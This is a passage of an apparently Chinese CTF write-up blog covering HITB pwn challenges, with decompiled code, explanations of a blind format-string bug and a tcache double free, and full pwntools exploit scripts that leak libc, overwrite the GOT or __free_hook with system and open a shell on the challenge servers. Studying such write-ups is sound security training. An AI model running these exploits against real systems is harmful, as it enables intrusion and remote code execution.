remote(<span class="string">'47.75.189.102'</span>, <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Invalid choice\n'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">8</span> + chr(<span class="number">0x58</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+ <span class="string">'\0'</span>*<span class="number">0x10</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]) + p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] )+ p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) +p64(<span class="number">0</span>)*<span class="number">4</span> )</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x08048e48 : add esp, 0x1c ; ret</span></span><br></pre></td></tr></table></figure><h1 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h1><p>此题题目给出的提示就是盲pwn ，通过测试可以明显分析出漏洞是格式化字符串，并且偏移是6。并且程序是64位程序，所以编写泄露脚本来dump脚本就可以了。</p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p><strong>此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断</strong></p><p>这一点坑了好久一直不懂为啥每次dump输出出来的内容都不对，最后dump出来后修改了几个字节读出了程序的正常逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+0h] [bp-110h]@2</span></span><br><span class="line">  __int64 v4; <span class="comment">// [sp+108h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = v28;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    gets((__int64)&amp;format, <span class="number">0L</span>L);</span><br><span class="line">    usleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了binary文件就比较简单了，通过got表可以泄露出题中给出的setbuf、gets、usleep函数地址，其中printf@got不可用，因为地址是0x6010<strong>20</strong> ，利用libc-database得到程序的libc。</p><p>最终通过修改gets@got为system及linux的并行命令拿到shell，64位的程序格式化字符串需要注意的坑点是哟啊先写字符串再加地址，否则是有截断的。</p><p><strong>EXP</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding:utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">#HITB&#123;Baby_Pwn_BabY_bl1nd&#125;</span><br><span class="line"></span><br><span class="line">#context(arch='i386',os='linux',endian='little')</span><br><span class="line">now = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process('./easy_pwn')</span><br><span class="line">libc = ELF('libc6_2.23-0ubuntu10_amd64.so')</span><br><span class="line">#context.kernel = 'amd64'</span><br><span class="line"><span class="meta">#off = 0x001b2000</span></span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">#gdb.attach(p,'vmmap')</span><br><span class="line">gdb.attach(p,'b *0x804882b')</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote('47.75.182.113', 9999)</span><br><span class="line">libc = ELF('libc6_2.23-0ubuntu10_amd64.so')</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">#libc = ELF('./libc-2.23.so')</span><br><span class="line"><span class="meta">#off = 0x001b0000</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">def leak(str,output,addr):</span><br><span class="line">global now,count </span><br><span class="line">#p.recvuntil('Username:')</span><br><span class="line"><span class="meta">#p.sendline(str)</span></span><br><span class="line">#p.recvuntil('Hello ')</span><br><span class="line">#if('Password')</span><br><span class="line">#tmp = p.recvuntil('p4nda')#recvuntil('p1e')</span><br><span class="line"><span class="meta">#a = tmp[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (tmp[0] == <span class="meta-string">'p'</span>) &amp; (tmp[1] == <span class="meta-string">'1'</span>)&amp; (tmp[2] == <span class="meta-string">'e'</span>):</span></span><br><span class="line"><span class="meta">#a = <span class="meta-string">'\0'</span></span></span><br><span class="line"><span class="meta">#print (a)</span></span><br><span class="line">#p = remote('47.75.182.113', 9999)</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil('&lt;&lt;&lt;&lt;')</span><br><span class="line">tmp = p.recvuntil('&gt;&gt;&gt;&gt;')</span><br><span class="line"><span class="meta">#print tmp</span></span><br><span class="line">if tmp.startswith('&gt;&gt;&gt;&gt;'):</span><br><span class="line">a = <span class="string">'\0'</span></span><br><span class="line">now += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> addr&amp;<span class="number">0xff</span> == <span class="number">0x0a</span>:</span><br><span class="line">#print '[-] error'</span><br><span class="line"><span class="meta">#exit(0)</span></span><br><span class="line">count +=<span class="number">1</span></span><br><span class="line">now += <span class="number">1</span></span><br><span class="line">a = '\xf0'</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = tmp.split('&gt;&gt;&gt;&gt;')[0]</span><br><span class="line">now += len(a)</span><br><span class="line">print a </span><br><span class="line">output.write(a)</span><br><span class="line">#p.close()</span><br><span class="line"></span><br><span class="line">#p.sendline('')</span><br><span class="line"></span><br><span class="line">def find_offset():</span><br><span class="line">for i in range(1,20):</span><br><span class="line">str = '%%%d$x'%(i)</span><br><span class="line">print '[%d]'%i</span><br><span class="line">leak(str)</span><br><span class="line"></span><br><span class="line">def ori_file(str,output):</span><br><span class="line">p.recvuntil('Username:')</span><br><span class="line">p.sendline(str)</span><br><span class="line">#p.recvuntil('p4nda')</span><br><span class="line">p.recvuntil('Hello ')</span><br><span class="line">a = p.recv(<span class="number">1</span>)</span><br><span class="line">print hex(<span class="keyword">int</span>(a)),</span><br><span class="line"></span><br><span class="line">output.write(a)</span><br><span class="line">p.recvuntil('Password')</span><br><span class="line">p.sendline('')</span><br><span class="line">def find_ori():</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">output = open('bin', 'wb')</span><br><span class="line">pro = log.progress('ori_geting')</span><br><span class="line">end = <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">while</span> now &lt; end:</span><br><span class="line">pro.status('recover:'+hex(0x400000+now))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+now)</span><br><span class="line">leak(str,output,<span class="number">0x400000</span>+now)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,0x1000):</span><br><span class="line">#find_offset()</span><br><span class="line">pro.status('recover:'+hex(0x400000+i))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+i)  #'%7$s'+'p1e'+'\0'+p64(0x400000+i)+'\np4nda\0\0\0'# + p32(0x8048970)</span><br><span class="line">leak(str,output,<span class="number">0x400000</span>+i)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,0x2000):</span><br><span class="line">#find_offset()</span><br><span class="line">pro.status('recover:'+hex(0x600000+i))</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x600000+i)# + p32(0x8048970)</span><br><span class="line">#str = '%7$s'+'p1e'+'\0'+p64(0x600000+i)+'\np4nda\0\0\0'# + p32(0x8048970)</span><br><span class="line">leak(str,output,<span class="number">0x600000</span>+i)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pro.success('get ori_file')</span><br><span class="line">output.close()</span><br><span class="line">#find_ori()</span><br><span class="line">def test():</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a = raw_input()</span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(int(a,16)) + '\n'# + p32(0x8048970) + </span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil('&lt;&lt;&lt;&lt;')</span><br><span class="line">tmp = p.recvuntil('&gt;&gt;&gt;&gt;')</span><br><span class="line">print tmp</span><br><span class="line">if tmp.startswith('&gt;&gt;&gt;&gt;'):</span><br><span class="line">a = <span class="string">'\0'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">a = tmp[<span class="number">0</span>]</span><br><span class="line">print a</span><br><span class="line">#test()</span><br><span class="line">#str = '%7$s'+'p1e'+'\0'+p64(0x40070b)</span><br><span class="line"><span class="meta">#p.sendline(str)</span></span><br><span class="line"><span class="meta">#def find_password():</span></span><br><span class="line"></span><br><span class="line">#str = '%14$s'+'\0'*2+'p4nda'+p32(0x804A08C)</span><br><span class="line">#find_password(str)</span><br><span class="line"><span class="meta">#i+=1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">for i in range(0,100):</span><br><span class="line">str = '%13$caaa' + p32(0x8040000+i*4)  </span><br><span class="line">leak(str)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">#print '[-] count ',count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601018) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak1 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601030) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601028) + '\n'</span><br><span class="line">p.sendline(str)</span><br><span class="line">p.recvuntil(<span class="string">"&lt;&lt;&lt;&lt;"</span>)</span><br><span class="line">leak3 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">print '[*] setbuf ',hex(leak1)</span><br><span class="line">print '[*] usleep ',hex(leak2)</span><br><span class="line">print '[*] gets   ',hex(leak3)</span><br><span class="line">libc.address = leak1 - libc.symbols['setbuf']</span><br><span class="line">print '[*] system ',hex(libc.symbols['system'])</span><br><span class="line">context.clear(arch = 'amd64')</span><br><span class="line">#str = repr(fmtstr_payload(7, &#123;0x601028: libc.symbols['system']-8 &#125;, write_size='byte'))</span><br><span class="line">target = libc.symbols['system']</span><br><span class="line">#str1 = <span class="string">"%%%dc%%12$hhn%%%dc%%13$hn"</span>%((target&amp;<span class="number">0xff</span>),(target&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>-(target&amp;<span class="number">0xff</span>)) </span><br><span class="line"></span><br><span class="line">str1 = <span class="string">"%%%dc%%12$hhn%%%dc%%13$hn"</span>%(((target&amp;<span class="number">0xff</span>)),(target&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>-(target&amp;<span class="number">0xff</span>)) </span><br><span class="line">str1 += ';/bin/sh\0;'</span><br><span class="line">str1 = str1.ljust(<span class="number">48</span>,<span class="string">'a'</span>)</span><br><span class="line">str1 += p64(<span class="number">0x601028</span>)</span><br><span class="line">str1 += p64(<span class="number">0x601029</span>)</span><br><span class="line">print '[+] ',len(str1)</span><br><span class="line">#'/bin/sh;' + p64(0x601028) + p64(0x601029) + p64(0x601030) + "%%%dc%%7$p"%((target &amp; 0xff) - 7) </span><br><span class="line">if ('\x20' in str1) | ('\x0a' in str1):</span><br><span class="line">print '[-]'</span><br><span class="line">print str1</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line">print str1</span><br><span class="line">p.sendline(str1)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">[*] setbuf  <span class="number">0x7fdcfdb2e6b0</span></span><br><span class="line">[*] usleep  <span class="number">0x7fdcfdbb5d60</span></span><br><span class="line">[*] gets    <span class="number">0x7fdcfdb26d80</span></span><br><span class="line">[*] system  <span class="number">0x7fdcfdafd390</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="gundam"><a href="#gundam" class="headerlink" title="gundam"></a>gundam</h1><p>此题是一道比较明显漏洞的题目，漏洞在destroy函数中，一个double free漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@5</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx@8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-Ch]@3</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !bss_sum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No gundam"</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Which gundam do you want to Destory:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">8</span> &amp;&amp; bss_list[(<span class="keyword">unsigned</span> __int64)v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)bss_list[(<span class="keyword">unsigned</span> __int64)v2] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(bss_list[(<span class="keyword">unsigned</span> __int64)v2] + <span class="number">8L</span>L));</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">LABEL_8:</span><br><span class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他不同的是本题使用的libc是libc 2.26版本，此版本及以后，加入了tcache功能，这个功能我在<a href="http://p4nda.top/2018/03/20/tcache/">之前的博客</a> 中分析过，加入这个功能会降低堆块利用的难度，只是地址泄露的时候有一定差别。</p><p>堆块会优先填充tcache并先从tcache中拿走，在从tcache中拿走的过程中并没有检查size，放入的过程中没有检查double free，因此存在double free可以劫持tcache，造成任意地址写。</p><p> 此题选择覆写__free_hook为system，最终free拿到shell。</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="comment">#HITB&#123;now_you_know_about_tcache&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./gundam'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.37.114'</span>, <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name,type)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'The name of gundam :'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">'The type of the gundam :'</span>)</span><br><span class="line">p.sendline(str(type))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Which gundam do you want to Destory:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">destroy(i)</span><br><span class="line">blow()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'Gundam[7] :aaaaaaaa'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">destroy(i)</span><br><span class="line">blow()</span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">build(<span class="string">'/bin/sh\0'</span>,<span class="number">1</span>) <span class="comment">#0 1</span></span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line">build(p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x10</span>),<span class="number">1</span>)<span class="comment"># 0 1 2</span></span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x30</span>,<span class="number">1</span>)</span><br><span class="line">build(p64(libc.symbols[<span class="string">'system'</span>])*<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">destroy(<span 